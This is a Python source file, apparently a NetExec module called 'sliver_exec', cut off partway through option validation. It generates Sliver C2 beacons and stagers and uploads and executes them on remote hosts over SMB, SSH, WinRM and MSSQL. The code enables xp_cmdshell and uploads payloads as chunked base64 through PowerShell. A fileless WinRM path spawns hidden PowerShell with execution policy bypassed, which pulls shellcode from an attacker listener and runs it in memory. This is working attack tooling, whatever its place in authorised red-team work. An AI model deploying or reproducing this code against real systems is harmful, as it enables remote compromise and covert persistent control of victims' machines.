import time
import os
import asyncio
import tempfile
import secrets
import string
import threading
import queue
import logging
import base64
from abc import ABC, abstractmethod

# Lazy import for nxc dependencies to support testing
CATEGORY = None

def _import_protobuf():
    global SliverClientConfig, SliverClient, grpc, clientpb, rpcpb, rpc_grpc
    if 'SliverClientConfig' not in globals() or SliverClientConfig is None:
        try:
            from sliver_client import SliverClientConfig, SliverClient  # pragma: no mutate
            import grpc  # pragma: no mutate
            from sliver_client.pb.clientpb import client_pb2 as clientpb  # pragma: no mutate
            from sliver_client.pb.rpcpb import services_pb2 as rpcpb  # pragma: no mutate
            from sliver_client.pb.rpcpb import services_pb2_grpc as rpc_grpc  # pragma: no mutate
        except ImportError:
            raise ImportError("Sliver client not available. This module should be installed with its packaged protobuf bindings.")

def _import_nxc():
    global CATEGORY
    if CATEGORY is None:
        try:
            from nxc.helpers.misc import CATEGORY
        except ImportError:
            # For testing, create a mock CATEGORY
            from unittest.mock import Mock
            CATEGORY = Mock()
            CATEGORY.PRIVILEGE_ESCALATION = "PRIVILEGE_ESCALATION"

# Initialize globals to None for lazy loading
SliverClientConfig = None
SliverClient = None
grpc = None
clientpb = None
rpcpb = None
rpc_grpc = None


class ModuleValidationError(Exception):
    """Raised when module option validation fails."""
    pass


class ModuleExecutionError(Exception):
    """Raised when module execution fails."""
    pass


class GrpcWorker:
    """
    Dedicated worker thread for gRPC operations with persistent event loop.
    """

    def __init__(self):
        self.task_queue = queue.Queue()
        self.result_queue = queue.Queue()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
        self.client = None
        self.config_path = None
        self.connected = False

    def _run_loop(self):
        """Main worker loop that processes gRPC tasks."""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        while True:
            try:
                task = self.task_queue.get(timeout=1.0)
            except queue.Empty:
                continue  # No task yet; keep polling without error
            if task is None:  # Shutdown signal
                break

            try:
                method_name, args, kwargs = task
                method = getattr(self, f'_do_{method_name}')
                result = loop.run_until_complete(method(*args, **kwargs))
                self.result_queue.put(('success', result))
            except Exception as e:
                self.result_queue.put(('error', e))
            finally:
                self.task_queue.task_done()

    def submit_task(self, method_name, *args, **kwargs):
        """Submit a task to the worker thread."""
        self.task_queue.put((method_name, args, kwargs))
        status, result = self.result_queue.get()
        if status == 'error':
            raise result
        return result

    async def _do_connect(self, config_path):
        """Connect to Sliver server."""
        _import_protobuf()
        if config_path is None:
            raise ValueError("Sliver config_path cannot be None. Ensure a valid path is set in module config.")
        cfg = SliverClientConfig.parse_config_file(config_path)
        if not all([cfg.ca_certificate, cfg.certificate, cfg.private_key]):
            raise ValueError("Sliver config missing certificates")
        if self.client is None or self.config_path != config_path:
            self.config_path = config_path
            self.client = SliverClient(cfg)
            self.connected = False
        if not self.connected:
            try:
                await self.client.connect()
                self.connected = True
                # Patch client for raw staging RPCs
                self.client.raw_stub = self.client._stub
            except Exception as connect_e:
                error_str = str(connect_e).lower()
                if "connection refused" in error_str or ("unavailable" in error_str and "failed to connect" in error_str):
                    host = getattr(cfg, 'server_host', '127.0.0.1')
                    port = getattr(cfg, 'server_port', 31337)
                    raise ValueError(
                        f"Failed to connect to Sliver server at {host}:{port}. "
                        "Ensure the Sliver server is running (`sliver-server`) and reachable. "
                        "If using proxychains, add `localnet {host} {port}` to proxychains.conf."
                    ) from connect_e
                else:
                    raise RuntimeError(f"Sliver client connection error: {connect_e}") from connect_e
        return self.client

    async def _do_jobs(self):
        """Get list of jobs/listeners."""
        client = await self._do_connect(self.config_path)
        return await client.jobs()

    async def _do_start_mtls_listener(self, host, port):
        """Start mTLS listener."""
        client = await self._do_connect(self.config_path)
        await client.start_mtls_listener(host, port)

    async def _do_start_tcp_stager_listener(self, host, port):
        """Start TCP stager listener."""
        client = await self._do_connect(self.config_path)
        _import_protobuf()
        req = clientpb.StagerListenerReq()
        req.Host = host
        req.Port = port
        req.Protocol = clientpb.StageProtocol.TCP
        resp = await client.raw_stub.StartTCPStagerListener(req, timeout=30)
        return resp

    async def _do_implant_profiles(self):
        """Get list of implant profiles."""
        client = await self._do_connect(self.config_path)
        return await client.implant_profiles()

    async def _do_save_implant_profile(self, profile_pb):
        """Save an implant profile."""
        client = await self._do_connect(self.config_path)
        return await client.save_implant_profile(profile_pb)

    async def _do_generate_implant(self, ic, name):
        """Generate a Sliver implant from ImplantConfig."""
        client = await self._do_connect(self.config_path)

        resp = await client.generate_implant(ic, name)
        if not resp.File or not resp.File.Data:
            raise ValueError(f"Failed to generate implant: {resp.Err or 'unknown'}")
        return resp
    
    async def _do_generate_stage(self, req):  # Change: Accept full req object
        """Generate stager payload from full GenerateStageReq."""
        client = await self._do_connect(self.config_path)
        resp = await client.raw_stub.GenerateStage(req, timeout=30)
        if not resp.File or not resp.File.Data:
            raise ValueError(f"Failed to generate stage: {resp.Err or 'unknown'}")
        return resp
    
    async def _do_stage_implant_build(self, req):  # Change: Accept full req for repeated Build
        """Stage implant builds for serving via listener."""
        client = await self._do_connect(self.config_path)
        resp = await client.raw_stub.StageImplantBuild(req, timeout=30)
        return resp
    
    async def _do_start_stager_listener(self, host, port, protocol, profile_name=None, stage_data=None):
        """Start stager listener based on protocol.
        
        TCP: Uses dedicated StartTCPStagerListener RPC with embedded stage data.
        HTTP/HTTPS: Starts regular HTTP(S) listener. Stage must already be registered
                    via StageImplantBuild before calling this method.
        
        Args:
            host: Bind host
            port: Bind port  
            protocol: 'tcp', 'http', or 'https'
            profile_name: Name of implant profile (required for TCP)
            stage_data: Stage payload bytes (required for TCP)
        
        Returns:
            Job ID of the started listener
        """
        client = await self._do_connect(self.config_path)
        _import_protobuf()
        protocol = protocol.lower()
        
        if protocol == "tcp":
            # TCP has dedicated stager listener with embedded data
            if not profile_name or not stage_data:
                raise ValueError("profile_name and stage_data required for TCP stager")
            req = clientpb.StagerListenerReq()
            req.Host = host
            req.Port = port
            req.Protocol = clientpb.StageProtocol.TCP
            req.ProfileName = profile_name
            req.Data = stage_data
            resp = await client.raw_stub.StartTCPStagerListener(req, timeout=30)
            return resp.JobID
        elif protocol in ["http", "https"]:
            # HTTP/HTTPS uses regular listener
            # Stage must already be registered via StageImplantBuild
            req = clientpb.HTTPListenerReq()
            req.Host = host
            req.Port = port
            req.Secure = (protocol == "https")
            
            if protocol == "https":
                resp = await client.raw_stub.StartHTTPSListener(req, timeout=30)
            else:
                resp = await client.raw_stub.StartHTTPListener(req, timeout=30)
            
            return resp.JobID
        else:
            raise ValueError(f"Unsupported SHELLCODE_PROTOCOL: {protocol} (use 'tcp', 'http', or 'https')")

    async def _do_generate_shellcode(self, ic):
        """Generate shellcode directly using Generate RPC."""
        client = await self._do_connect(self.config_path)
        _import_protobuf()
        req = clientpb.GenerateReq(Config=ic)
        # Raw RPC call
        resp = await client._stub.Generate(req, timeout=30)
        if not resp.File or not resp.File.Data:
            raise ValueError(f"Failed to generate shellcode: {resp.Err or 'unknown'}")
        return resp

    async def _do_beacons(self):
        """Get list of beacons."""
        client = await self._do_connect(self.config_path)
        return await client.beacons()

    async def _do_sessions(self):
        """Get list of sessions."""
        client = await self._do_connect(self.config_path)
        return await client.sessions()

    async def _do_website_add_content(self, website_name, path, content_type, content_bytes):
        """Add content to a Sliver website."""
        client = await self._do_connect(self.config_path)
        _import_protobuf()
        
        content = clientpb.WebContent()
        content.Path = path
        content.ContentType = content_type
        content.Content = content_bytes
        
        add_req = clientpb.WebsiteAddContent()
        add_req.Name = website_name
        add_req.Contents[path].CopyFrom(content)
        
        return await client._stub.WebsiteAddContent(add_req)

    async def _do_website_remove(self, website_name):
        """Remove a Sliver website."""
        client = await self._do_connect(self.config_path)
        _import_protobuf()
        website_req = clientpb.Website()
        website_req.Name = website_name
        return await client._stub.WebsiteRemove(website_req)

    async def _do_start_http_listener_with_website(self, host, port, website_name, secure=False):
        """Start HTTP listener linked to a website."""
        client = await self._do_connect(self.config_path)
        _import_protobuf()
        
        req = clientpb.HTTPListenerReq()
        req.Host = host
        req.Port = port
        req.Secure = secure
        req.Website = website_name
        
        if secure:
            resp = await client._stub.StartHTTPSListener(req)
        else:
            resp = await client._stub.StartHTTPListener(req)
        return resp

    async def _do_kill_job(self, job_id):
        """Kill a running job/listener by ID."""
        client = await self._do_connect(self.config_path)
        _import_protobuf()
        
        kill_req = clientpb.KillJobReq()
        kill_req.ID = job_id
        return await client._stub.KillJob(kill_req)

    def shutdown(self):
        """Shutdown the worker thread."""
        self.task_queue.put(None)
        self.thread.join(timeout=5.0)


class ProtocolHandler(ABC):
    def __init__(self, module):
        self.module = module  # Access to shared NXCModule state

    def _chunked_upload(self, context, connection, local_path, full_remote_path, exec_ps_cmd, chunk_size=1024 * 2):
        """
        ... (existing doc)
        chunk_size: Raw bytes per chunk (default 2KB; override per-protocol).
        """
        # Read and encode the file to base64
        with open(local_path, 'rb') as f:
            file_data = f.read()

        b64_data = base64.b64encode(file_data).decode('ascii')

        # Split into chunks of specified size
        chunks = []
        for i in range(0, len(b64_data), chunk_size):
            chunks.append(b64_data[i:i + chunk_size])

        context.log.display(f"Uploading file in {len(chunks)} chunks")

        # Create temporary file on target
        temp_file = f"{full_remote_path}.b64"
        ps_cmd = f'''
try {{
    New-Item -Path '{temp_file}' -ItemType File -Force | Out-Null
    Write-Host "Temp file created"
}} catch {{
    Write-Host "Error creating temp file: $_"
}}
'''
        result = exec_ps_cmd(ps_cmd)
        if result and result.strip():
            context.log.info(f"PowerShell output: {result[:500]}{'...' if len(result) > 500 else ''}")

        # Upload each chunk
        for i, chunk in enumerate(chunks):
            context.log.debug(f"Uploading chunk {i + 1}/{len(chunks)}")
            ps_cmd = f'''
try {{
    $chunk = @"
{chunk}
"@
    Add-Content -Path '{temp_file}' -Value $chunk -NoNewline
    Write-Host "Chunk {i + 1} added"
}} catch {{
    Write-Host "Error adding chunk {i + 1}: $_"
}}
'''
            result = exec_ps_cmd(ps_cmd)
            if result and result.strip():
                context.log.info(f"PowerShell output: {result[:500]}{'...' if len(result) > 500 else ''}")

        # Decode and save the final file
        ps_cmd = f'''
try {{
    $base64 = Get-Content -Path '{temp_file}' -Raw
    $bytes = [Convert]::FromBase64String($base64)
    [IO.File]::WriteAllBytes('{full_remote_path}', $bytes)
    Remove-Item -Path '{temp_file}' -Force
    Write-Host "File decoded and saved"
}} catch {{
    Write-Host "Error decoding/saving: $_"
}}
'''
        result = exec_ps_cmd(ps_cmd)
        if result and result.strip():
            context.log.info(f"PowerShell output: {result[:500]}{'...' if len(result) > 500 else ''}")

    @abstractmethod
    def get_remote_paths(self, os_type, implant_name):
        """
        Return (full_remote_path: str, share: str|None).
        full_remote_path: Exec path on target (e.g., 'C:\\Windows\\Temp\\implant.exe').
        share: For SMB; None for others.
        """
        pass

    @abstractmethod
    def upload(self, context, connection, local_path, full_remote_path):
        """Upload local_path to full_remote_path. Raise on failure."""
        pass

    @abstractmethod
    def execute(self, context, connection, full_remote_path, os_type):
        """Execute the implant at full_remote_path. Log success/warn."""
        pass

    @abstractmethod
    def stage_execute(self, context, connection, os_type, stager_data):
        """Execute the stager shellcode/data. Log success/warn. Raise if unsupported."""
        pass

    @abstractmethod
    def get_cleanup_cmd(self, full_remote_path, os_type):
        """Return shell cmd str to delete the file (e.g., 'del /f ...')."""
        pass


class SMBHandler(ProtocolHandler):
    def get_remote_paths(self, os_type, implant_name):
        if os_type == "windows":
            full_path = f"C:\\Windows\\Temp\\{implant_name}"
            share = self.module.share_config or "ADMIN$"
        else:  # Linux via Samba
            full_path = f"/tmp/{implant_name}"
            share = self.module.share_config or "IPC$"
        return full_path, share

    def upload(self, context, connection, local_path, full_remote_path):
        os_type = self.module.os_type
        share = self.module.share_config
        if os_type == "windows":
            if full_remote_path.lower().startswith("c:\\"):
                smb_path = "\\" + full_remote_path[3:]
            else:
                smb_path = full_remote_path.replace("/", "\\")
        else:
            smb_path = os.path.basename(full_remote_path)
        remote_dir = smb_path.rsplit("\\", 1)[0] if "\\" in smb_path else smb_path.rsplit("/", 1)[0]
        if remote_dir and remote_dir != "":
            if os_type == "windows":
                mkdir_cmd = f'mkdir "{remote_dir}" 2>nul'
                try:
                    connection.execute(mkdir_cmd, methods=["smbexec"])
                except Exception as mk_e:
                    context.log.debug(f"Mkdir skipped (exec fail): {mk_e}")
            else:
                context.log.debug("Skipping remote mkdir via smbexec on Linux target; will upload file directly")
        connection.conn.reconnect()
        connection.conn.putFile(share, smb_path, open(local_path, "rb").read)
        context.log.success("SMB upload complete")

    def execute(self, context, connection, full_remote_path, os_type, **kwargs):
        method = "smbexec"
        if os_type == "windows":
            cmd = f'cmd /c "{full_remote_path}"'
        else:
            cmd = f"./{os.path.basename(full_remote_path)}"
        try:
            connection.execute(cmd, methods=[method])
            context.log.info(f"Executed via SMB: {full_remote_path}")
        except Exception as e:
            context.log.warning(f"SMB exec failed: {e}")

    def stage_execute(self, context, connection, os_type, stager_data):
        context.log.fail("Staging not supported on SMB")
        raise NotImplementedError("SMB staging requires uploaded stager exe; not yet implemented")

    def get_cleanup_cmd(self, full_remote_path, os_type):
        return f'del /f /q "{full_remote_path}"' if os_type == "windows" else f'rm -f "{full_remote_path}"'


class SSHHandler(ProtocolHandler):
    def get_remote_paths(self, os_type, implant_name):
        if os_type != "linux":
            raise ValueError("SSH handler assumes Linux target")
        return f"/tmp/{implant_name}", None

    def upload(self, context, connection, local_path, full_remote_path):
        try:
            sftp = connection.conn.open_sftp()
            sftp.put(local_path, full_remote_path)
            sftp.close()
            connection.execute(f"chmod +x '{full_remote_path}'")
            context.log.success("SSH upload complete")
        except Exception as e:
            context.log.fail(f"SSH upload failed: {e}")
            raise

    def execute(self, context, connection, full_remote_path, os_type, **kwargs):
        cmd = f"nohup {full_remote_path} >/dev/null 2>&1 &"
        try:
            connection.execute(cmd)
            context.log.info(f"Executed via SSH: {full_remote_path}")
        except Exception as e:
            context.log.warning(f"SSH exec failed: {e}")

    def stage_execute(self, context, connection, os_type, stager_data):
        context.log.fail("Staging not supported on SSH")
        raise NotImplementedError("SSH staging requires uploaded stager shellcode; not yet implemented")

    def get_cleanup_cmd(self, full_remote_path, os_type):
        return f"rm -f '{full_remote_path}'"


class WinRMHandler(ProtocolHandler):
    def get_remote_paths(self, os_type, implant_name):
        if os_type != "windows":
            raise ValueError("WinRM handler assumes Windows target")
        return f"C:\\Windows\\Temp\\{implant_name}", None

    def upload(self, context, connection, local_path, full_remote_path):
        # For staging, skip upload (stager is executed directly)
        if local_path is None and full_remote_path is None:
            return

        def exec_ps_cmd(ps_cmd):
            return connection.ps_execute(ps_cmd, get_output=True)

        try:
            # WinRM's default max envelope size is 150KB
            self._chunked_upload(context, connection, local_path, full_remote_path, exec_ps_cmd, chunk_size=1024 * 50)
            context.log.success("WinRM upload complete (via chunked base64)")
        except Exception as e:
            context.log.fail(f"WinRM upload failed: {e}")
            raise

    def execute(self, context, connection, full_remote_path, os_type, **kwargs):
        # Handle staging mode
        if 'stager_data' in kwargs:
            return self.stage_execute(context, connection, os_type, kwargs['stager_data'])

        ps_cmd = f'(Get-WmiObject -Class Win32_Process -List).Create("{full_remote_path}") | Out-Null'
        try:
            result = connection.ps_execute(ps_cmd, get_output=True)
            if result and result.strip():
                context.log.debug(f"PowerShell output: {result}")
            context.log.info(f"Executed via WinRM: {full_remote_path}")
        except Exception as e:
            context.log.warning(f"WinRM exec failed: {e}")

    def stage_execute(self, context, connection, os_type, stager_data):
        """Execute fileless bootstrap stager via WinRM.
        
        This method executes the tiny PowerShell bootstrap (~2KB) that downloads
        full shellcode (~17MB) from a Sliver stager listener and runs it in-memory.
        
        The bootstrap is encoded for PowerShell's -EncodedCommand parameter using
        the standard encoding chain: UTF-8 → UTF-16LE → Base64
        
        Execution method:
            - Uses WMI Win32_Process.Create to spawn detached PowerShell process
            - Process runs hidden (-WindowStyle Hidden) with no execution policy
            - Bootstrap downloads shellcode from stager listener
            - Shellcode executes in-memory (VirtualAlloc + CreateThread)
            - No disk writes (fully fileless)
        
        WinRM envelope limit:
            WinRM has a 150KB message size limit. The bootstrap payload must stay
            well under this limit. Typical bootstrap size: ~2-3KB encoded.
        
        Args:
            context: NetExec context for logging
            connection: NetExec WinRM connection object
            os_type: Target OS (currently unused - retained for interface compatibility)
            stager_data: Raw bootstrap bytes from _generate_sliver_stager() (UTF-8 encoded)
        
        Returns:
            True if WMI spawn succeeded, False otherwise
        """
        # Decode raw UTF-8 bytes to PowerShell script string
        bootstrap_ps = stager_data.decode('utf-8')
        
        # Encode for PowerShell -EncodedCommand parameter
        # PowerShell expects: UTF-16LE + Base64 encoding
        encoded_cmd = base64.b64encode(bootstrap_ps.encode('utf-16-le')).decode('ascii')
        
        total_size = len(encoded_cmd)
        context.log.info(f"Bootstrap payload size: {total_size} bytes")
        
        # Verify payload size is under WinRM's 150KB envelope limit
        # Typical bootstrap: ~2-3KB (well under limit)
        if total_size > 150 * 1024:
            context.log.fail(f"Bootstrap payload ({total_size} bytes) exceeds WinRM 150KB limit!")
            return False
        
        # Execute bootstrap via WMI (detached process)
        # This spawns powershell.exe with the encoded bootstrap command
        wmi_cmd = f'''(Get-WmiObject -Class Win32_Process -List).Create('powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_cmd}') | Out-Null'''
        try:
            result = connection.ps_execute(wmi_cmd, get_output=True)
            if result and result.strip():
                context.log.debug(f"WMI spawn output: {result}")
            context.log.info("Bootstrap stager injected (fileless download from stager listener)")
            return True
        except Exception as e:
            context.log.fail(f"WinRM stager exec failed: {e}")
            return False

    def get_cleanup_cmd(self, full_remote_path, os_type):
        return f"Remove-Item -Force '{full_remote_path}'"


class MSSQLHandler(ProtocolHandler):
    def get_remote_paths(self, os_type, implant_name):
        if os_type != "windows":
            raise ValueError("MSSQL handler assumes Windows target")
        return f"C:\\Users\\Public\\{implant_name}", None

    def upload(self, context, connection, local_path, full_remote_path):
        import base64

        def query_option_state(option):
            """Direct SQL query for option state (0/1)."""
            try:
                result = connection.sql_query(f"SELECT value FROM sys.configurations WHERE name='{option}'")
                return result[0]['value'] if result else 0
            except Exception as e:
                context.log.warning(f"Failed to query {option} state: {e}")
                return 0

        def set_option(option, enabled):
            """Direct sp_configure + RECONFIGURE."""
            try:
                sql = f"EXEC sp_configure '{option}', {enabled}; RECONFIGURE;"
                connection.conn.sql_query(sql)
                context.log.debug(f"{option} set to {enabled}")
            except Exception as e:
                context.log.fail(f"Failed to set {option}={enabled}: {e}")
                raise

        # Step 1: Backup original states
        adv_orig = query_option_state('show advanced options')
        xp_orig = query_option_state('xp_cmdshell')
        context.log.debug(f"Original: advanced={adv_orig}, xp_cmdshell={xp_orig}")

        # Step 2: Enable xp_cmdshell
        if adv_orig == 0:
            set_option('show advanced options', 1)
        if xp_orig == 0:
            set_option('xp_cmdshell', 1)

        # Run chunked upload (mssqlexec skips toggle since enabled)
        def exec_ps_cmd(ps_cmd):
            encoded_script = base64.b64encode(ps_cmd.encode('utf-16-le')).decode('ascii')
            shell_cmd = f'powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_script}'
            return connection.execute(shell_cmd)

        try:
            # Chunk size tuned for MSSQL xp_cmdshell command length limits
            self._chunked_upload(context, connection, local_path, full_remote_path, exec_ps_cmd, chunk_size=1800)
            context.log.success("MSSQL upload complete (chunked base64 via xp_cmdshell)")
        finally:
            # Restore originals
            if adv_orig == 0:
                set_option('show advanced options', 0)
            if xp_orig == 0:
                set_option('xp_cmdshell', 0)
            context.log.debug("Restored original option states")

    def execute(self, context, connection, full_remote_path, os_type, **kwargs):
        import base64
        wmi_ps = f'(Get-WmiObject -Class Win32_Process -List).Create("{full_remote_path}") | Out-Null'
        encoded_script = base64.b64encode(wmi_ps.encode('utf-16-le')).decode('ascii')
        shell_cmd = f'powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_script}'
        try:
            connection.execute(shell_cmd)
            context.log.info(f"Executed via MSSQL (WMI): {full_remote_path}")
        except Exception as e:
            context.log.warning(f"MSSQL exec failed: {e}")

    def stage_execute(self, context, connection, os_type, stager_data):
        context.log.fail("Staging not supported on MSSQL")
        raise NotImplementedError("MSSQL staging requires xp_cmdshell shellcode exec; not yet implemented")

    def get_cleanup_cmd(self, full_remote_path, os_type):
        return f"del /f /q \"{full_remote_path}\""


# Import nxc dependencies lazily
_import_nxc()

class NXCModule:
    """
    NetExec module for generating and executing unique Sliver beacons on remote targets via multiple protocols.
    """
    name = "sliver_exec"
    description = "Generates unique Sliver beacon and executes on target"
    supported_protocols = ["smb", "ssh", "winrm", "mssql"]
    opsec_safe = False
    multiple_hosts = False
    category = CATEGORY.PRIVILEGE_ESCALATION

    # Single shared worker for all instances (fixes multi-thread gRPC poller races)
    _shared_worker = None

    priv_levels = {
        "smb": "HIGH",
        "mssql": "HIGH",
        "ssh": "LOW",
        "winrm": "LOW"
    }

    @classmethod
    def _get_shared_worker(cls):
        if cls._shared_worker is None:
            cls._shared_worker = GrpcWorker()
        return cls._shared_worker

    def __init__(self):
        """Initialize module state and logging."""
        # logging.getLogger("nxc").setLevel(logging.DEBUG)

        # Suppress gRPC poller cleanup race errors (grpc/grpc#34139)
        # A cleanup race where the poller reader isn't unregistered from the event loop before socket closure,
        class SuppressPollerErrorFilter(logging.Filter):
            def filter(self, record):
                # Suppress gRPC poller races (non-fatal)
                if 'PollerCompletionQueue._handle_events' in record.getMessage() and 'BlockingIOError' in str(record.exc_info):
                    return False
                return True

        # Apply to asyncio and gRPC loggers
        logging.getLogger('asyncio').addFilter(SuppressPollerErrorFilter())
        logging.getLogger('grpc').addFilter(SuppressPollerErrorFilter())

        # Configuration options
        self.implant_base_path = None
        self.format = None
        self.extension = None
        self.wait_seconds = 90
        self.rhost = None
        self.rport = None
        self.cleanup_mode = "always"  # "always", "success", or "never"
        self.staging_mode = None  # "download", "shellcode", "none", or None
        self.shellcode_listener_host = None
        self.shellcode_listener_port = None
        self.http_staging_port = None
        self.shellcode_protocol = "http"
        self.download_tool = "powershell"  # Windows: powershell, certutil, bitsadmin; Linux: wget, curl, python
        self.beacon_interval = 5  # seconds (default: 5s)
        self.beacon_jitter = 3  # seconds (default: 3s)
        self.os_type = None
        self.arch = None
        self.share_config = None
        self.config_path = None
        self.profile = None
        # Runtime state
        self.local_implant_path = None
        self.stager_data = None

    def options(self, context, module_options):
        """
        Parse and validate module options from NetExec.
        Called by NetExec framework before on_admin_login.
        """
        self._validate_required_options(context, module_options)
        self._parse_module_options(context, module_options)
        self._load_sliver_config(context)

    def _validate_required_options(self, context, module_options):
        """
        Ensure required options are provided and valid.
        Exits if missing or invalid.
        """
        # Known options
        known_options = {
            "IMPLANT_BASE_PATH", "RHOST", "RPORT", "CLEANUP", "OS", "ARCH",
            "SHARE", "PROFILE", "WAIT", "FORMAT", "STAGING",
            "BEACON_INTERVAL", "BEACON_JITTER",
            # New staging options
            "HTTP_STAGING_PORT", "SHELLCODE_LISTENER_HOST", "SHELLCODE_LISTENER_PORT", "SHELLCODE_PROTOCOL", "DOWNLOAD_TOOL",
            # New cleanup mode option
            "CLEANUP_MODE"
        }

        # Check for unknown options
        for key in module_options:
            if key not in known_options:
                context.log.fail(f"Unknown option: {key}")
                context.log.fail("Valid options: RHOST, RPORT, STAGING, HTTP_STAGING_PORT, SHELLCODE_LISTENER_HOST, SHELLCODE_LISTENER_PORT, SHELLCODE_PROTOCOL, DOWNLOAD_TOOL, BEACON_INTERVAL, BEACON_JITTER, OS, ARCH, CLEANUP_MODE, WAIT, PROFILE")
                context.log.fail("See: nxc <protocol> -M sliver_exec --options")
                raise ModuleValidationError("Unknown option provided")

        # Acceptable option sets:
        #  - RHOST (with optional RPORT, defaults to 443)
        #  - PROFILE (use existing profile)
        has_rhost = bool(module_options.get("RHOST") is not None)
        has_profile = bool(module_options.get("PROFILE") is not None)

        if not (has_rhost or has_profile):
            context.log.fail("Either RHOST OR PROFILE must be provided")
            context.log.fail("")
            context.log.fail("Examples:")
            context.log.fail("  Using RHOST:   -o RHOST=10.0.0.5")
            context.log.fail("  Using RHOST with custom port: -o RHOST=10.0.0.5 RPORT=8888")
            context.log.fail("  Using PROFILE: -o PROFILE=my_profile")
            context.log.fail("")
            context.log.fail("See: nxc <protocol> -M sliver_exec --options")
            raise ModuleValidationError("Missing required option")

        # If RHOST provided, validate it and optional RPORT
        if has_rhost:
            # Validate RHOST is a valid IPv4 address
            import ipaddress
            try:
                ipaddress.IPv4Address(module_options["RHOST"])
            except ipaddress.AddressValueError:
                context.log.fail(f"RHOST must be a valid IPv4 address: {module_options['RHOST']}")
                context.log.fail("")
                context.log.fail("Example: -o RHOST=10.0.0.5")
                raise ModuleValidationError("Invalid RHOST")

            # Validate RPORT if provided (optional, defaults to 443)
            if module_options.get("RPORT"):
                try:
                    port = int(module_options["RPORT"])
                    if not (1 <= port <= 65535):
                        raise ValueError()
                except (ValueError, TypeError):
                    context.log.fail(f"RPORT must be a valid port number (1-65535): {module_options['RPORT']}")
                    context.log.fail("")
                    context.log.fail("Example: -o RHOST=10.0.0.5 RPORT=8888")
                    raise ModuleValidationError("Invalid RPORT")

        # If PROFILE provided, validate simple presence (more validation occurs later)
        if has_profile:
            if not module_options.get("PROFILE"):
                context.log.fail("PROFILE cannot be empty")
                raise ModuleValidationError("Invalid PROFILE")

        # For staging, validate stager options if provided
        staging_value = module_options.get("STAGING", "none")
        staging_value = staging_value.lower()
        # Validate STAGING value
        if staging_value not in ("download", "shellcode", "none", "false", "0", "no"):
            context.log.fail("STAGING must be 'download', 'shellcode', or 'none' (default: none)")
            raise ModuleValidationError("Invalid STAGING value")

        staging_enabled = staging_value in ("download", "shellcode")

        if staging_enabled:

            # Validate SHELLCODE_LISTENER_HOST if provided (for shellcode staging)
            if module_options.get("SHELLCODE_LISTENER_HOST"):
                import ipaddress
                try:
                    ipaddress.IPv4Address(module_options["SHELLCODE_LISTENER_HOST"])
                except ipaddress.AddressValueError:
                    context.log.fail(f"SHELLCODE_LISTENER_HOST must be a valid IPv4 address: {module_options['SHELLCODE_LISTENER_HOST']}")
                    raise ModuleValidationError("Invalid SHELLCODE_LISTENER_HOST")

            # Validate SHELLCODE_LISTENER_PORT if provided (for shellcode staging)
            if module_options.get("SHELLCODE_LISTENER_PORT"):
                try:
                    port = int(module_options["SHELLCODE_LISTENER_PORT"])
                    if not (1 <= port <= 65535):
                        raise ValueError()
                except (ValueError, TypeError):
                    context.log.fail(f"SHELLCODE_LISTENER_PORT must be a valid port number (1-65535): {module_options['SHELLCODE_LISTENER_PORT']}")
                    raise ModuleValidationError("Invalid SHELLCODE_LISTENER_PORT")

            # Validate HTTP_STAGING_PORT if provided (for download staging)
            http_staging_port = module_options.get("HTTP_STAGING_PORT")
            if http_staging_port:
                try:
                    port = int(http_staging_port)
                    if not (1 <= port <= 65535):
                        raise ValueError()
                except (ValueError, TypeError):
                    context.log.fail(f"HTTP_STAGING_PORT must be a valid port number (1-65535): {http_staging_port}")
                    context.log.fail("")
                    context.log.fail("Example: -o STAGING=download HTTP_STAGING_PORT=8080")
                    raise ModuleValidationError("Invalid HTTP_STAGING_PORT")

            # Validate SHELLCODE_PROTOCOL if provided (for shellcode staging)
            shellcode_protocol = module_options.get("SHELLCODE_PROTOCOL")
            if shellcode_protocol:
                shellcode_protocol = shellcode_protocol.lower()
                if shellcode_protocol not in ["http", "tcp", "https"]:
                    context.log.fail("SHELLCODE_PROTOCOL must be 'http', 'tcp', or 'https' (default: http)")
                    raise ModuleValidationError("Invalid SHELLCODE_PROTOCOL")

            # Validate DOWNLOAD_TOOL if provided (for download staging)
            download_tool = module_options.get("DOWNLOAD_TOOL")
            if download_tool:
                download_tool = download_tool.lower()
                valid_methods = ["powershell", "certutil", "bitsadmin", "wget", "curl", "python"]
                if download_tool not in valid_methods:
                    context.log.fail(f"DOWNLOAD_TOOL must be one of: {', '.join(valid_methods)} (default: powershell)")
                    context.log.fail("")
                    context.log.fail("Example: -o STAGING=download DOWNLOAD_TOOL=certutil")
                    raise ModuleValidationError("Invalid DOWNLOAD_TOOL")

        # Validate CLEANUP_MODE if provided
        cleanup_value = module_options.get("CLEANUP_MODE")
        if cleanup_value:
            cleanup_str = str(cleanup_value).lower()
            if cleanup_str not in ("always", "success", "never"):
                context.log.fail("CLEANUP_MODE must be one of: always, success, never (default: always)")
                context.log.fail("")
                context.log.fail("Examples:")
                context.log.fail("  -o CLEANUP_MODE=always    # Always cleanup (default)")
                context.log.fail("  -o CLEANUP_MODE=success   # Only cleanup if beacon registered")
                context.log.fail("  -o CLEANUP_MODE=never     # Never cleanup")
                raise ModuleValidationError("Invalid CLEANUP_MODE")

        # Validate BEACON_INTERVAL if provided
        beacon_interval = module_options.get("BEACON_INTERVAL")
        if beacon_interval:
            try:
                interval = int(beacon_interval)
                if interval < 1 or interval > 3600:
                    raise ValueError()
            except (ValueError, TypeError):
                context.log.fail(f"BEACON_INTERVAL must be between 1-3600 seconds: {beacon_interval}")
                context.log.fail("")
                context.log.fail("Example: -o BEACON_INTERVAL=10")
                raise ModuleValidationError("Invalid BEACON_INTERVAL")

        # Validate BEACON_JITTER if provided
        beacon_jitter = module_options.get("BEACON_JITTER")
        if beacon_jitter:
            try:
                jitter = int(beacon_jitter)
                if jitter < 0 or jitter > 3600:
                    raise ValueError()
            except (ValueError, TypeError):
                context.log.fail(f"BEACON_JITTER must be between 0-3600 seconds: {beacon_jitter}")
                context.log.fail("")
                context.log.fail("Example: -o BEACON_JITTER=3")
                raise ModuleValidationError("Invalid BEACON_JITTER")

        # Validate WAIT if provided
        wait = module_options.get("WAIT")
        if wait:
            try:
                wait_val = int(wait)
                if wait_val < 1 or wait_val > 3600:
                    raise ValueError()
            except (ValueError, TypeError):
